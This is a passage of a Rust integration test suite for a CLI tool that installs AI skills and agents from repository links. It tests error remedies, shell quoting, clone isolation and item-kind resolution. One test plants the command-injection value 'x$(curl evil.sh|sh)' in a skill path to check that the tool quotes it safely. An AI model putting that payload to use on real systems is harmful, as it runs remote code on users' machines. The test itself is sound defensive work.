        "upgrade must warn about the dropped entry: {combined}"
    );
    let after = sb.mind(&["recall", "skill:review"]);
    assert!(
        after.stdout.contains("dropped") && after.stdout.contains("agent:dev"),
        "the drop record must reflect the upgraded version: {}",
        after.stdout
    );
}

#[test]
fn link_install_keeps_the_dep7_causes_as_hard_errors() {
    // spec: LNK-18 -- only a NoMatch entry is dropped. A source-qualified entry
    // is wrong regardless of the catalog, so it keeps its DEP-7 CrossSource
    // cause as a hard error rather than being silently dropped with the rest.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nrequires: owner/repo#agent:dev\n---\n# review\n",
    );
    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(
        !r.success,
        "a source-qualified requires must stay a hard error: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("crosses sources"),
        "the specific DEP-7 cause must survive: {}",
        r.stderr
    );
    assert!(
        !sb.claude_home.join("skills/review").exists(),
        "nothing is installed when a kept entry fails"
    );
}

#[test]
fn link_install_of_a_skill_with_a_tools_token_errors_with_the_remedy() {
    // spec: LNK-18 -- `{{tools:}}` and `{{path:}}` resolve against siblings just
    // as `{{ns:}}` does, so they are equally unsatisfiable under a single-skill
    // catalog and get the same explanatory error, not the blunt TOOL-17 one.
    let sb = Sandbox::new();
    sb.write_and_commit("tools/fmt/fmt", "#!/bin/sh\necho fmt\n");
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\n---\n# review\n\nRun {{tools:fmt}} first.\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(
        !r.success,
        "an unresolvable tool token must fail: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("{{tools:fmt}}") && r.stderr.contains("single-item link"),
        "the error must name the token and the single-item catalog: {}",
        r.stderr
    );
    assert!(
        r.stderr.contains("mind unmeld") && r.stderr.contains("--learn 'skill:review'"),
        "the error must name the remedy: {}",
        r.stderr
    );
}

#[test]
fn link_install_scans_expand_listed_files_for_tokens_too() {
    // spec: LNK-18 -- install expands tokens in an `expand:`-listed non-markdown
    // file (NS-57), so the scan must cover it. A narrower scan would let the
    // reference through to the blunt error this rule exists to replace.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit("skills/review/run.py", "# hands off to {{ns:dev}}\n");
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\nexpand: run.py\n---\n# review\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(
        !r.success,
        "a token in an expand:-listed file must fail the install: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("{{ns:dev}}") && r.stderr.contains("single-item link"),
        "the expand:-listed file must get the LNK-18 error, not the blunt one: {}",
        r.stderr
    );
}

#[test]
fn link_install_of_a_skill_with_an_ns_token_errors_with_the_remedy() {
    // spec: LNK-18
    // A `{{ns:}}` token is rewritten into the item body (NS-10), so unlike a
    // `requires` entry it cannot be left dangling: it stays a hard error, but
    // one that explains the single-item catalog and names the remedy instead of
    // reporting a generic missing reference.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(!r.success, "an unresolvable token must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("{{ns:dev}}") && r.stderr.contains("single-item link"),
        "the error must name the token and the single-item catalog: {}",
        r.stderr
    );
    assert!(
        r.stderr.contains("mind meld") && r.stderr.contains("--learn 'skill:review'"),
        "the error must name the one-command remedy: {}",
        r.stderr
    );
    assert!(
        !sb.claude_home.join("skills/review").exists(),
        "nothing is installed when the token cannot be expanded"
    );
}

#[test]
fn the_remedy_adds_a_root_when_the_repo_declares_a_different_skill_of_the_same_name() {
    // spec: LNK-18 DSC-84
    // The case the by-path reachability rule exists for. The repo's
    // authoritative `mind.toml` declares a skill whose BARE NAME is exactly the
    // linked one's, but at a DIFFERENT path (`vendor/review`, not the linked
    // `skills/review`). Deciding reachability by name would call this "a plain
    // meld finds it" and print the rootless remedy -- which, pasted, melds the
    // repo and installs the DECOY under the name the user asked for. Deciding
    // by path answers "not reachable", so the remedy carries `--add-root`, and
    // the root reaches the skill the link actually pointed at.
    let sb = Sandbox::bare("agents");
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: the linked one\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );
    sb.write_and_commit(
        "vendor/review/SKILL.md",
        "---\ndescription: a decoy of the same bare name\n---\n# decoy\n",
    );
    sb.write_and_commit(
        "mind.toml",
        "[[items]]\nkind = \"skill\"\nname = \"review\"\npath = \"vendor/review\"\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(!r.success, "the token must fail the install: {}", r.stdout);
    let remedy = extract_remedy(&r.stderr);
    assert!(
        remedy.contains("--add-root"),
        "a same-named skill at another path must NOT count as reachable, or the \
         remedy would meld the decoy: {remedy}"
    );

    // Why that matters, demonstrated rather than asserted in the abstract: run
    // the rootless form -- exactly what a by-NAME reachability rule would have
    // printed here, since a plain meld of this repo does offer a
    // `skill:review` -- and watch it install the DECOY under the name the user
    // asked for. Every half succeeds, so the wrong skill lands silently; the
    // by-path rule is the only thing standing between the user and this.
    let rootless = remedy.replace(" --add-root '.'", "");
    assert_ne!(rootless, remedy, "the remedy really did carry a root");
    for (i, run) in run_remedy(&sb, &rootless).into_iter().enumerate() {
        assert!(
            run.success,
            "step {i} of the rootless form `{rootless}` was expected to succeed \
             (that is the trap): {} {}",
            run.stdout, run.stderr
        );
    }
    let text = std::fs::read_to_string(sb.claude_home.join("skills/review/SKILL.md"))
        .expect("the rootless form installs a skill/review");
    assert!(
        text.contains("a decoy of the same bare name"),
        "the rootless form silently installs the DECOY, which is exactly what \
         the by-path rule exists to avoid printing: {text}"
    );
}

#[test]
fn the_remedy_for_a_nested_skill_works_verbatim() {
    // spec: LNK-18 DSC-84
    // `link_add_root` derives `vendor/pkg` for a skill at
    // `vendor/pkg/skills/review`; the unit test pins the STRING, this pins that
    // the derived root actually makes the meld half discover the skill. A fixed
    // `--add-root .` reaches only `<repo-root>/skills/<name>`, so with it this
    // remedy would fail with `LearnPatternNoMatch` AFTER the unmeld half had
    // already dropped the instance -- the destroy-then-fail sequence the
    // two-branch remedy exists to prevent.
    let sb = Sandbox::bare("agents");
    sb.write_and_commit(
        "vendor/pkg/skills/review/SKILL.md",
        "---\ndescription: nested\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    // Authoritative and silent about the nested skill, so only the added root
    // can reach it. It does declare `dev`, so once the whole repo is melded the
    // token the link could not satisfy resolves.
    sb.write_and_commit(
        "mind.toml",
        "[[items]]\nkind = \"agent\"\nname = \"dev\"\npath = \"agents/dev.md\"\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/vendor/pkg/skills/review")]);
    assert!(!r.success, "the token must fail the install: {}", r.stdout);
    let remedy = extract_remedy(&r.stderr);
    assert!(
        remedy.contains("--add-root 'vendor/pkg'"),
        "the remedy must name the directory the one-level-deep scan starts \
         from: {remedy}"
    );

    for (i, run) in run_remedy(&sb, &remedy).into_iter().enumerate() {
        assert!(
            run.success,
            "step {i} of the printed remedy `{remedy}` failed: {} {}",
            run.stdout, run.stderr
        );
    }
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the derived root must actually make the meld half reach the nested \
         skill: `{remedy}`"
    );
    assert_eq!(source_count(&sb), 1, "the link instance must be replaced");
}

#[test]
fn the_remedy_for_a_flat_nested_skill_works_verbatim() {
    // spec: LNK-18 DSC-84
    // The flat half of the same derivation: a skill directory that is a bare
    // child of `vendor/` (no `skills/` container) needs `--add-root 'vendor'`,
    // its own parent. `link_add_root`'s container check keys on the parent
    // directory's NAME, so this is the branch that would break if that check
    // ever grew looser (`my-skills/` and friends).
    let sb = Sandbox::bare("agents");
    sb.write_and_commit(
        "vendor/review/SKILL.md",
        "---\ndescription: flat nested\n---\n# review\n\nHand off to {{ns:dev}}.\n",
    );
    sb.write_and_commit(
        "agents/dev.md",
        "---\nname: dev\ndescription: Dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "mind.toml",
        "[[items]]\nkind = \"agent\"\nname = \"dev\"\npath = \"agents/dev.md\"\n",
    );

    let r = sb.mind(&["learn", &sb.link("tree/main/vendor/review")]);
    assert!(!r.success, "the token must fail the install: {}", r.stdout);
    let remedy = extract_remedy(&r.stderr);
    assert!(
        remedy.contains("--add-root 'vendor'"),
        "a flat nested skill's root is its own parent: {remedy}"
    );

    for (i, run) in run_remedy(&sb, &remedy).into_iter().enumerate() {
        assert!(
            run.success,
            "step {i} of the printed remedy `{remedy}` failed: {} {}",
            run.stdout, run.stderr
        );
    }
    assert!(
        sb.claude_home.join("skills/review").exists(),
        "the derived root must actually make the meld half reach the flat \
         nested skill: `{remedy}`"
    );
}

#[test]
fn learn_pattern_no_match_shell_quotes_a_hostile_link_identity_end_to_end() {
    // spec: CLI-236 CLI-225
    // `LearnPatternNoMatch`'s message embeds the searched source's identity in
    // its own suggested `mind probe --source ... --no-tui` command. For an item
    // link that identity is `host/owner/repo#<item_path>`, and `item_path` is
    // validated only against traversal (LNK-10), never against shell
    // metacharacters -- so a repo can put `$(...)` in it. The unit test in
    // error.rs pins the message function; this drives the whole path through
    // the real binary, including `main.rs`'s `eprintln!("error: {err}")`, to
    // prove the quoting survives to the terminal rather than being reassembled
    // somewhere in between.
    let sb = Sandbox::bare("agents");
    let hostile = "x$(curl evil.sh|sh)";
    sb.write_and_commit(
        &format!("skills/{hostile}/SKILL.md"),
        "---\ndescription: hostile name\n---\n# hostile\n",
    );

    let r = sb.mind(&[
        "meld",
        &sb.link(&format!("tree/main/skills/{hostile}")),
        "--learn",
        "nope",
        "--yes",
    ]);
    assert!(
        !r.success,
        "a pattern matching nothing must fail: {} {}",
        r.stdout, r.stderr
    );
    let identity = sb.link_name(&format!("skills/{hostile}"));
    assert!(
        r.stderr.contains(&format!(
            "mind probe --source {} --no-tui",
            shell_quote(&identity)
        )),
        "the suggested command must carry the shell-quoted identity: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains(&format!("--source {identity} --no-tui")),
        "the identity must never reach the terminal bare inside the runnable \
         command: {}",
        r.stderr
    );
    // The instance is registered before the install pass, so the failure leaves
    // it melded (CLI-236) -- and the quoted command really does address it.
    assert_eq!(source_count(&sb), 1, "the source stays melded");
    let probe = sb.mind(&["probe", "--source", &identity, "--no-tui"]);
    assert!(
        probe.success && probe.stdout.contains(hostile),
        "the remedy the message prints must be a command that works: {} {}",
        probe.stdout,
        probe.stderr
    );
}

/// Mirrors `crate::error::shell_quote` (HOOK-106/CLI-225). Reproduced here
/// (not imported) because an integration test is a separate crate from the
/// binary and cannot reach a `pub(crate)` item.
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

#[test]
fn forget_of_an_emptied_link_hint_shell_quotes_a_quote_carrying_identity() {
    // spec: LNK-5, CLI-225 -- the item-link identity is `local/<base>/<repo>#
    // <path>`, and `is_safe_manifest_path` allows the `#<path>` segment to
    // carry a `'` (only path traversal is rejected). The forget-of-an-
    // emptied-link hint used to frame the identity in bare single quotes
    // (`'{src_name}'`), which a `'` inside it would break out of; it must be
    // shell-quoted instead. Proven as a real round trip: the printed
    // `mind unmeld` command, run verbatim, drops exactly that instance.
    let sb = Sandbox::new();
    sb.write_and_commit(
        "skills/rev'iew/SKILL.md",
        "---\ndescription: a quote-carrying item\n---\n# skill\n",
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/rev'iew")])
            .success
    );
    let name = sb.link_name("skills/rev'iew");
    let r = sb.mind(&["forget", "skill:rev'iew"]);
    assert!(r.success, "forget failed: {} {}", r.stdout, r.stderr);

    let quoted = shell_quote(&name);
    assert!(
        r.stderr.contains(&format!("mind unmeld {quoted}")),
        "the hint must shell-quote the quote-carrying identity: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains(&format!("mind unmeld '{name}'")),
        "the identity must never be framed in bare single quotes \
         (it would break out at the embedded '): {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 1, "the instance stays registered");

    // Real round trip: extract the printed command, tokenize as a shell
    // would, and run it -- it must drop exactly the aliased instance.
    let start = r.stderr.find("`mind ").expect("remedy present") + 1;
    let rest = &r.stderr[start..];
    let end = rest.find('`').unwrap_or(rest.len());
    let cmd = &rest[..end];
    let mut argv = shell_split(cmd);
    assert_eq!(argv.first().map(String::as_str), Some("mind"));
    argv.remove(0);
    let args: Vec<&str> = argv.iter().map(String::as_str).collect();
    let unmeld = sb.mind(&args);
    assert!(
        unmeld.success,
        "the round-tripped remedy must succeed: {} {}",
        unmeld.stdout, unmeld.stderr
    );
    assert_eq!(
        source_count(&sb),
        0,
        "the round-tripped `mind unmeld` must have dropped exactly the aliased instance"
    );
}

/// A minimal shell tokenizer for the single-quote + `'\''` idiom
/// `shell_quote` produces. Mirrors `tests/cli_hooks.rs`'s `shell_split`.
fn shell_split(s: &str) -> Vec<String> {
    let chars: Vec<char> = s.chars().collect();
    let n = chars.len();
    let mut i = 0;
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut in_token = false;
    while i < n {
        let c = chars[i];
        if c.is_whitespace() {
            if in_token {
                tokens.push(std::mem::take(&mut cur));
                in_token = false;
            }
            i += 1;
            continue;
        }
        in_token = true;
        if c == '\'' {
            i += 1;
            while i < n && chars[i] != '\'' {
                cur.push(chars[i]);
                i += 1;
            }
            assert!(i < n, "unterminated single quote in {s:?}");
            i += 1;
        } else if c == '\\' && i + 1 < n && chars[i + 1] == '\'' {
            cur.push('\'');
            i += 2;
        } else {
            cur.push(c);
            i += 1;
        }
    }
    if in_token {
        tokens.push(cur);
    }
    tokens
}

#[test]
fn curated_sources_entry_can_be_an_item_link() {
    // spec: LNK-2
    // A [discover].sources entry may be a deep link; the curator's meld
    // registers the link instance (register-only, DSC-54).
    let lib = Sandbox::new();
    let curator = Sandbox::bare("curator");
    curator.write_and_commit(
        "mind.toml",
        &format!(
            "[discover]\nsources = [{{ source = \"{}\" }}]\n",
            lib.link("tree/main/skills/review")
        ),
    );
    let spec = curator.source.to_string_lossy().into_owned();
    let r = curator.mind(&["meld", &spec, "--register-only"]);
    assert!(r.success, "curator meld failed: {} {}", r.stdout, r.stderr);
    let sources = curator.mind(&["recall", "--sources"]);
    assert!(
        sources.stdout.contains("#skills/review"),
        "the curated link instance must register: {}",
        sources.stdout
    );
}

#[test]
fn link_registers_no_nested_sources() {
    // spec: LNK-8
    // The linked repo curates another source; a link into it must not walk
    // that curator layer.
    let other = Sandbox::new();
    let sb = Sandbox::new();
    sb.write_and_commit(
        "mind.toml",
        &format!(
            "[discover]\nsources = [{{ source = \"{}\" }}]\n",
            other.source.to_string_lossy()
        ),
    );
    let r = sb.mind(&["learn", &sb.link("tree/main/skills/review")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    assert_eq!(
        source_count(&sb),
        1,
        "the linked repo's [discover].sources must not be walked"
    );
}

#[test]
fn meld_url_with_namespace_prefixes_the_skill() {
    // spec: LNK-9
    let sb = Sandbox::new();
    let r = sb.mind(&[
        "meld",
        &sb.link("tree/main/skills/review"),
        "--namespace",
        "pfx",
        "--register-only",
    ]);
    assert!(r.success, "meld failed: {} {}", r.stdout, r.stderr);
    let probe = sb.mind(&["probe"]);
    assert!(
        probe.stdout.contains("skill:pfx:review"),
        "the link's skill must carry the namespace: {}",
        probe.stdout
    );
}

#[test]
fn policy_allowlist_matches_the_base_repo_identity() {
    // spec: LNK-11
    // The allow pattern names the repo (no #path); a link into it melds under
    // lock. Matching against the extended identity would refuse it.
    let sb = Sandbox::new();
    let policy_path = sb.base.join("policy.toml");
    write(
        &policy_path,
        "[sources]\nlock = true\nallow = [\"local/*/agents\"]\n",
    );
    let policy = policy_path.to_string_lossy().into_owned();
    let r = sb.mind_env(
        &["learn", &sb.link("tree/main/skills/review")],
        &[("MIND_POLICY_FILE", policy.as_str())],
    );
    assert!(
        r.success,
        "an allowed repo must allow links into it: {} {}",
        r.stdout, r.stderr
    );
    // And a repo outside the allowlist stays refused for links too.
    let other = Sandbox::new();
    let deny_path = other.base.join("policy.toml");
    write(
        &deny_path,
        "[sources]\nlock = true\nallow = [\"local/*/other\"]\n",
    );
    let deny = deny_path.to_string_lossy().into_owned();
    let r = other.mind_env(
        &["learn", &other.link("tree/main/skills/review")],
        &[("MIND_POLICY_FILE", deny.as_str())],
    );
    assert!(
        !r.success,
        "a non-allowed repo must refuse links: {}",
        r.stdout
    );
}

#[test]
fn learn_blob_url_not_ending_in_skill_md_reports_bad_item_link() {
    // spec: LNK-14
    // A blob URL that does not end in /SKILL.md carries a tree/blob marker,
    // so it is an attempted item link that failed to parse: the error must
    // name the expected shapes, not the generic invalid-repo-spec message.
    let sb = Sandbox::new();
    let url = sb.link("blob/main/skills/review");
    let r = sb.mind(&["learn", &url]);
    assert!(!r.success, "a malformed blob link must fail: {}", r.stdout);
    assert!(
        r.stderr.contains(&url),
        "the error must name the offending URL: {}",
        r.stderr
    );
    assert!(
        r.stderr.contains("tree/<ref>") && r.stderr.contains("blob/<ref>"),
        "the error must name the expected link shapes: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains("not a valid repo spec"),
        "the error must not fall back to the generic repo-spec message: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn learn_tree_url_with_no_path_reports_bad_item_link() {
    // spec: LNK-14
    // A tree URL missing its skill-directory path is likewise an attempted
    // item link that failed to parse.
    let sb = Sandbox::new();
    let url = sb.link("tree/main");
    let r = sb.mind(&["learn", &url]);
    assert!(!r.success, "a pathless tree link must fail: {}", r.stdout);
    assert!(
        r.stderr.contains(&url),
        "the error must name the offending URL: {}",
        r.stderr
    );
    assert!(
        r.stderr.contains("tree/<ref>") && r.stderr.contains("blob/<ref>"),
        "the error must name the expected link shapes: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains("not a valid repo spec"),
        "the error must not fall back to the generic repo-spec message: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn meld_plain_bad_spec_keeps_the_generic_invalid_repo_spec_message() {
    // spec: LNK-14
    // A bad spec with no tree/blob marker at all is not an attempted item
    // link, so it must keep reporting the generic invalid-repo-spec message,
    // unaffected by the LNK-14 routing. `meld` (unlike `learn`, which only
    // parses a spec as a repo/link when it contains "://") always parses its
    // argument through the same repo-spec parser (source.rs::parse_spec).
    let sb = Sandbox::new();
    let r = sb.mind(&["meld", "notarealspec"]);
    assert!(!r.success, "a malformed spec must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("not a valid repo spec"),
        "a marker-less bad spec must keep the generic message: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn json_error_envelope_kind_is_bad_item_link() {
    // spec: LNK-14, CLI-181, CLI-182
    // Under --json, a malformed item-link URL (tree/blob marker present, tail
    // fails to parse) must emit the standard error envelope
    // {"schema":1,"error":{"kind":"bad-item-link","message":"..."}} on stdout,
    // not the generic "invalid-repo-spec" kind.
    let sb = Sandbox::new();
    let url = sb.link("tree/main");
    let r = sb.mind(&["learn", &url, "--json"]);
    assert!(!r.success, "a pathless tree link must fail: {}", r.stdout);
    let v: serde_json::Value = serde_json::from_str(r.stdout.trim())
        .unwrap_or_else(|e| panic!("stdout is not valid JSON ({e}): {:?}", r.stdout));
    assert_eq!(v["schema"], 1, "schema must be 1: {}", r.stdout);
    let err = &v["error"];
    assert_eq!(
        err["kind"], "bad-item-link",
        "kind must be bad-item-link, not the generic invalid-repo-spec: {}",
        r.stdout
    );
    let msg = err["message"].as_str().unwrap_or("");
    assert!(
        msg.contains(&url),
        "message must name the offending URL: {msg}"
    );
    assert!(
        !r.stderr.contains("error:"),
        "main error handler must not write to stderr under --json: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn link_instances_at_different_refs_keep_independent_commits_after_sync() {
    // spec: STO-70
    // Two links into the SAME repo at different item paths, pinned to
    // DIFFERENT branches, must not clobber each other's clone. This is the
    // C31 bug: before STO-70, `clone_dir` ignored `item_path`, so both
    // instances (and a plain meld of the repo) resolved to the identical
    // clone directory; syncing one instance's branch checkout onto that
    // shared directory would silently discard the other's. The existing
    // `link_instances_and_a_plain_meld_coexist` test above uses `tree/main`
    // for both links, so even under the old bug both instances would read
    // identical content post-clobber and the bug stayed invisible; pinning
    // the two instances to DIFFERENT branches with DIFFERENT content makes a
    // clobber observable.
    let sb = Sandbox::new(); // skills/review, skills/extra on `main`.
    git(&sb.source, &["checkout", "-b", "other"]);
    sb.write_and_commit(
        "skills/extra/SKILL.md",
        "---\ndescription: A second skill\n---\n# extra skill\non the other branch\n",
    );
    git(&sb.source, &["checkout", "main"]);

    // review is pinned to `main`; extra is pinned to `other`.
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/other/skills/extra")])
            .success
    );

    let extra_initial =
        std::fs::read_to_string(sb.claude_home.join("skills/extra/SKILL.md")).unwrap();
    assert!(
        extra_initial.contains("on the other branch"),
        "extra must install from `other`'s content: {extra_initial}"
    );

    // Diverge both branches further, independently.
    git(&sb.source, &["checkout", "main"]);
    sb.write_and_commit(
        "skills/review/SKILL.md",
        "---\ndescription: Review the diff for bugs\n---\n# review skill\nmain edit\n",
    );
    git(&sb.source, &["checkout", "other"]);
    sb.write_and_commit(
        "skills/extra/SKILL.md",
        "---\ndescription: A second skill\n---\n# extra skill\nother edit\n",
    );
    git(&sb.source, &["checkout", "main"]);

    assert!(sb.mind(&["sync"]).success, "sync must succeed");
    let up = sb.mind(&["upgrade", "--yes"]);
    assert!(up.success, "upgrade failed: {} {}", up.stdout, up.stderr);

    let review_final =
        std::fs::read_to_string(sb.claude_home.join("skills/review/SKILL.md")).unwrap();
    let extra_final =
        std::fs::read_to_string(sb.claude_home.join("skills/extra/SKILL.md")).unwrap();
    assert!(
        review_final.contains("main edit"),
        "review must reflect main's own edit: {review_final}"
    );
    assert!(
        !review_final.contains("other edit"),
        "review must not be clobbered by other's content: {review_final}"
    );
    assert!(
        extra_final.contains("other edit"),
        "extra must reflect other's own edit: {extra_final}"
    );
    assert!(
        !extra_final.contains("main edit"),
        "extra must not be clobbered by main's content: {extra_final}"
    );
}

#[test]
fn unmeld_of_one_link_instance_leaves_the_others_clone_and_skill_intact() {
    // spec: STO-70
    // Before STO-70, two non-aliased link instances into the same repo shared
    // one clone directory; `unmeld`'s cleanup of one instance's clone would
    // remove that shared directory out from under the other, breaking its
    // installed skill and any future sync of it.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/extra")])
            .success
    );

    let name_review = sb.link_name("skills/review");
    let r = sb.mind(&["unmeld", &name_review, "--yes"]);
    assert!(r.success, "unmeld failed: {} {}", r.stdout, r.stderr);

    // The unmelded instance's skill is gone...
    assert!(
        !sb.claude_home.join("skills/review").exists(),
        "the unmelded instance's skill must be uninstalled"
    );
    // ...but the surviving instance's skill and registration are untouched.
    assert!(
        sb.claude_home.join("skills/extra").exists(),
        "the surviving instance's installed skill must remain"
    );
    let extra_content =
        std::fs::read_to_string(sb.claude_home.join("skills/extra/SKILL.md")).unwrap();
    assert!(extra_content.contains("A second skill"));

    let sources = sb.mind(&["recall", "--sources"]).stdout;
    assert!(
        sources.contains("#skills/extra"),
        "the surviving instance must stay registered: {sources}"
    );
    assert!(
        !sources.contains("#skills/review"),
        "the unmelded instance must be gone: {sources}"
    );

    // The surviving instance's clone directory itself -- keyed on its own
    // encoded item_path, per the STO-70 leaf formula -- must still be present
    // on disk.
    let survivor_clone = sb
        .mind_home
        .join("sources")
        .join("local")
        .join(sb.base.file_name().unwrap())
        .join(format!(
            "{}#skills%2Fextra",
            sb.source.file_name().unwrap().to_string_lossy()
        ));
    assert!(
        survivor_clone.join(".git").is_dir(),
        "the surviving instance's own clone dir must remain: {survivor_clone:?}"
    );

    // And it must still be fully usable: a further sync succeeds.
    let r2 = sb.mind(&["sync"]);
    assert!(
        r2.success,
        "sync after unmeld must still succeed: {} {}",
        r2.stdout, r2.stderr
    );
}

#[test]
fn dump_emits_a_reconstructed_link_entry_not_a_skip_note() {
    // spec: LNK-13
    // `dump` now emits a reconstructed deep-URL entry for a link instance
    // (round-tripped in tests/cli_dump.rs), rather than skipping it with a
    // note. This pins that basic behavior from the item-link side: the entry
    // is present and no "skipping item link" note is printed.
    let sb = Sandbox::new();
    assert!(
        sb.mind(&["learn", &sb.link("tree/main/skills/review")])
            .success
    );
    let r = sb.mind(&["dump"]);
    assert!(r.success, "dump failed: {} {}", r.stdout, r.stderr);
    assert!(
        !r.stderr.contains("skipping item link"),
        "dump must no longer skip an item-link instance: {}",
        r.stderr
    );
    assert!(
        r.stdout.contains("skills/review"),
        "an entry reconstructing the link instance must be emitted: {}",
        r.stdout
    );
}

// ----- LNK-20..23: single-file item links (agent / rule / command) -----

/// A sandbox repo carrying one file item per kind, plus one at an
/// unconventional path.
fn file_item_sandbox() -> Sandbox {
    let sb = Sandbox::bare("lib");
    sb.write_and_commit(
        "agents/dev.md",
        "---\ndescription: The dev agent\n---\n# dev\n",
    );
    sb.write_and_commit(
        "rules/style.md",
        "---\ndescription: House style\n---\n# style\n",
    );
    sb.write_and_commit(
        "commands/ship.md",
        "---\ndescription: Ship it\n---\n# ship\n",
    );
    sb
}

#[test]
fn blob_link_to_an_agent_file_installs_just_that_agent() {
    // spec: LNK-20 LNK-21 LNK-7
    // A blob link to `agents/dev.md` is a file link: the item is that one
    // file, kind from the containing directory, name from the file stem.
    let sb = file_item_sandbox();
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("agents/dev.md").exists(),
        "the linked agent must be installed"
    );
    assert!(
        !sb.claude_home.join("rules/style.md").exists(),
        "the repo's other items must NOT be installed"
    );
    let sources = sb.mind(&["recall", "--sources"]);
    assert!(
        sources.stdout.contains("#agents/dev.md"),
        "the instance identity carries the file path: {}",
        sources.stdout
    );
    let probe = sb.mind(&["probe"]);
    assert!(
        probe.stdout.contains("agent:dev") && !probe.stdout.contains("rule:style"),
        "the catalog is exactly the linked file: {}",
        probe.stdout
    );
}

#[test]
fn file_link_kind_comes_from_the_containing_directory() {
    // spec: LNK-21
    // rules/ -> rule and commands/ -> command, with no annotation.
    for (path, target) in [
        ("blob/main/rules/style.md", "rules/style.md"),
        ("blob/main/commands/ship.md", "commands/ship.md"),
    ] {
        let sb = file_item_sandbox();
        let r = sb.mind(&["learn", &sb.link(path)]);
        assert!(r.success, "{path}: learn failed: {} {}", r.stdout, r.stderr);
        assert!(
            sb.claude_home.join(target).exists(),
            "{path}: must install as {target}"
        );
    }
}

#[test]
fn file_link_kind_falls_back_to_frontmatter() {
    // spec: LNK-21
    // A file outside a conventional directory is classified by its own
    // frontmatter `kind:`.
    let sb = Sandbox::bare("lib");
    sb.write_and_commit(
        "vendor/style.md",
        "---\nkind: rule\ndescription: House style\n---\n# style\n",
    );
    let r = sb.mind(&["learn", &sb.link("blob/main/vendor/style.md")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("rules/style.md").exists(),
        "frontmatter kind decides where it links"
    );
}

#[test]
fn explicit_kind_outranks_the_containing_directory_and_is_recorded() {
    // spec: LNK-21 LNK-22 CLI-239 STO-81
    // `--kind` is step 1 of the resolution order, and it is persisted on the
    // instance so every later scan classifies the item the same way.
    let sb = file_item_sandbox();
    let r = sb.mind(&[
        "learn",
        &sb.link("blob/main/agents/dev.md"),
        "--kind",
        "rule",
    ]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    assert!(
        sb.claude_home.join("rules/dev.md").exists()
            && !sb.claude_home.join("agents/dev.md").exists(),
        "--kind rule must win over the agents/ directory"
    );
    let json = std::fs::read_to_string(sb.mind_home.join("sources.json")).expect("sources.json");
    assert!(
        json.contains("\"item_kind\": \"rule\"") || json.contains("\"item_kind\":\"rule\""),
        "the explicit kind must be recorded on the instance: {json}"
    );
    // A later scan reads the recorded kind back.
    let recall = sb.mind(&["recall"]);
    assert!(
        recall.stdout.contains("rule:dev"),
        "the recorded kind is what recall reports: {}",
        recall.stdout
    );
}

#[test]
fn a_directory_resolved_kind_records_nothing() {
    // spec: LNK-22
    // Only an explicit kind is persisted; a directory-resolved one is
    // re-derived from the pinned clone on every scan.
    let sb = file_item_sandbox();
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    let json = std::fs::read_to_string(sb.mind_home.join("sources.json")).expect("sources.json");
    assert!(
        !json.contains("item_kind"),
        "no explicit kind was given, so none is recorded: {json}"
    );
}

#[test]
fn file_link_with_no_resolvable_kind_errors_and_registers_nothing() {
    // spec: LNK-21
    let sb = Sandbox::bare("lib");
